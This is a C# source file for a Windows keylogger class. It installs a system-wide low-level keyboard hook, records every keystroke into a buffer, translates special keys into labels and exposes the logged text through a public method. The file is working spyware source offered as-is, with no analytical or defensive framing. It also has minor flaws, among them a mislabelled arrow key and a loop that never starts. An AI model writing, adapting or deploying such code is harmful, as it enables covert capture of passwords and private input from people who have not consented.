

namespace Keylogger
{


    public class Keylogger
    {
        private static System.Text.StringBuilder _stringBuilder = null;
        private System.IntPtr hhook;

        
        private enum HookType : int
        {
            /// <summary>
            /// Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box,
            /// message box, menu, or scroll bar. For more information, see the MessageProc hook procedure.
            /// </summary>
            WH_MSGFILTER = -1,
            /// <summary>
            /// Installs a hook procedure that records input messages posted to the system message queue. This hook is
            /// useful for recording macros. For more information, see the JournalRecordProc hook procedure.
            /// </summary>
            WH_JOURNALRECORD = 0,
            /// <summary>
            /// Installs a hook procedure that posts messages previously recorded by a WH_JOURNALRECORD hook procedure.
            /// For more information, see the JournalPlaybackProc hook procedure.
            /// </summary>
            WH_JOURNALPLAYBACK = 1,
            /// <summary>
            /// Installs a hook procedure that monitors keystroke messages. For more information, see the KeyboardProc
            /// hook procedure.
            /// </summary>
            WH_KEYBOARD = 2,
            /// <summary>
            /// Installs a hook procedure that monitors messages posted to a message queue. For more information, see the
            /// GetMsgProc hook procedure.
            /// </summary>
            WH_GETMESSAGE = 3,
            /// <summary>
            /// Installs a hook procedure that monitors messages before the system sends them to the destination window
            /// procedure. For more information, see the CallWndProc hook procedure.
            /// </summary>
            WH_CALLWNDPROC = 4,
            /// <summary>
            /// Installs a hook procedure that receives notifications useful to a CBT application. For more information,
            /// see the CBTProc hook procedure.
            /// </summary>
            WH_CBT = 5,
            /// <summary>
            /// Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box,
            /// message box, menu, or scroll bar. The hook procedure monitors these messages for all applications in the
            /// same desktop as the calling thread. For more information, see the SysMsgProc hook procedure.
            /// message box, menu, or scroll bar. The hook procedure monitors these messages for all applications in the same desktop as the calling thread. For more information, see the SysMsgProc hook procedure.
            /// </summary>
            WH_SYSMSGFILTER = 6,
            /// <summary>
            /// Installs a hook procedure that monitors mouse messages. For more information, see the MouseProc hook
            /// procedure.
            /// </summary>
            WH_MOUSE = 7,
            /// <summary>
            ///
            /// </summary>
            WH_HARDWARE = 8,
            /// <summary>
            /// Installs a hook procedure useful for debugging other hook procedures. For more information, see the
            /// DebugProc hook procedure.
            /// </summary>
            WH_DEBUG = 9,
            /// <summary>
            /// Installs a hook procedure that receives notifications useful to shell applications. For more information,
            /// see the ShellProc hook procedure.
            /// </summary>
            WH_SHELL = 10,
            /// <summary>
            /// Installs a hook procedure that will be called when the application's foreground thread is about to become
            /// idle. This hook is useful for performing low priority tasks during idle time. For more information, see the
            /// ForegroundIdleProc hook procedure.
            /// </summary>
            WH_FOREGROUNDIDLE = 11,
            /// <summary>
            /// Installs a hook procedure that monitors messages after they have been processed by the destination window
            /// procedure. For more information, see the CallWndRetProc hook procedure.
            /// </summary>
            WH_CALLWNDPROCRET = 12,
            /// <summary>
            /// Installs a hook procedure that monitors low-level keyboard input events. For more information, see the
            /// LowLevelKeyboardProc hook procedure.
            /// </summary>
            WH_KEYBOARD_LL = 13,
            /// <summary>
            /// Installs a hook procedure that monitors low-level mouse input events. For more information, see the
            /// LowLevelMouseProc hook procedure.
            /// </summary>
            WH_MOUSE_LL = 14
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct NativeMessage
        {
            public System.IntPtr handle;
            public uint msg;
            public System.IntPtr wParam;
            public System.IntPtr lParam;
            public uint time;
            public System.Drawing.Point p;
        }


        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, [System.Runtime.InteropServices.Out] System.Text.StringBuilder lpChar, uint uFlags);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern System.IntPtr CallNextHookEx(System.IntPtr hhk, int nCode, System.IntPtr wParam, System.IntPtr lParam);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern System.IntPtr GetModuleHandle(string lpModuleName);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern System.IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, System.IntPtr hMod, uint dwThreadId);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool PeekMessage(out NativeMessage lpMsg, System.IntPtr handle, uint filterMin, uint filterMax, uint flags);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(System.IntPtr hhk);

        private static System.IntPtr CallbackFunction(int code, System.IntPtr wParam, System.IntPtr lParam)
        {
            System.Int32 msgType = wParam.ToInt32();
            System.Int32 vKey;
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                vKey = System.Runtime.InteropServices.Marshal.ReadInt32(lParam);
                _stringBuilder.Append(MapPressedKeyToOutput(vKey));
            }
            return CallNextHookEx(System.IntPtr.Zero, code, wParam, lParam);
        }

        
        [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Winapi)]
        private delegate System.IntPtr HookProc(int nCode, System.IntPtr wParam, System.IntPtr lParam);

        




        private static string MapPressedKeyToOutput(System.Int32 keyValue)
        {
            //https://www.oreilly.com/library/view/javascript-dhtml/9780596514082/apb.html
            switch (keyValue)
            {
                case 18:
                    return "<Alt>";
                case 40:
                    return "<ArrowUp>";
                case 37:
                    return "<ArrowLeft>";
                case 39:
                    return "<ArrowRight>";
                case 38:
                    return "<ArrowUp>";
                case 8:
                    return "<Backspace>";
                case 20:
                    return "<Caps>";
                case 17:
                    return "<CTRL>";
                case 46:
                    return "<Delete>";
                case 35:
                    return "<End>";
                case 27:
                    return "<Escape>";
                case 13:
                    return "\r\n";
                case 112:
                    return "<F1>";
                case 113:
                    return "<F2>";
                case 114:
                    return "<F3>";
                case 115:
                    return "<F4>";
                case 116:
                    return "<F5>";
                case 117:
                    return "<F6>";
                case 118:
                    return "<F7>";
                case 119:
                    return "<F8>";
                case 120:
                    return "<F9>";
                case 121:
                    return "<F10>";
                case 122:
                    return "<F11>";
                case 123:
                    return "<F12>";
                case 96:
                    return "<Numpad0>";
                case 97:
                    return "<Numpad1>";
                case 98:
                    return "<Numpad2>";
                case 99:
                    return "<Numpad3>";
                case 100:
                    return "<Numpad4>";
                case 101:
                    return "<Numpad5>";
                case 102:
                    return "<Numpad6>";
                case 103:
                    return "<Numpad7>";
                case 104:
                    return "<Numpad8>";
                case 105:
                    return "<Numpad9>";
                case 34:
                    return "<PgDwn>";
                case 33:
                    return "<PgUp>";
                case 19:
                    return "<Pause>";
                case 44:
                    return "<PrntScr>";
                case 145:
                    return "<ScrollLock>";
                case 160:
                    return "<Shift>";
                case 36:
                    return "<Home>";
                case 45:
                    return "<Insert>";
                case 144:
                    return "<NumLock>";
                case 109:
                    return "<Numpad->";
                case 106:
                    return "<Numpad*>";
                case 110:
                    return "<Numpad.>";
                case 111:
                    return "<Numpad/>";
                case 107:
                    return "<Numpad+>";
                default:
                    return System.Convert.ToChar(keyValue).ToString();
            }
        }


        public bool Running
        {
            get; set;
        }

        public Keylogger()
        {
            if (_stringBuilder == null)
            {
                _stringBuilder = new System.Text.StringBuilder();
            }
            else
            {
                _stringBuilder.Clear();
            }
            Running = false;
        }

        public void Start()
        {
           HookProc callback = CallbackFunction;
            _stringBuilder.Clear();
           string module = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
            System.IntPtr moduleHandle = GetModuleHandle(module);
            hhook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
            NativeMessage message = new NativeMessage();
            while (Running)
            {
                PeekMessage(out message, System.IntPtr.Zero, 0x100, 0x109, 0);
                System.Threading.Thread.Sleep(5);
            }
        }

        public void Stop()
        {
            Running = false;
            UnhookWindowsHookEx(hhook);
        }


        public string GetLoggedData()
        {
            return _stringBuilder.ToString();
        }
    }
}
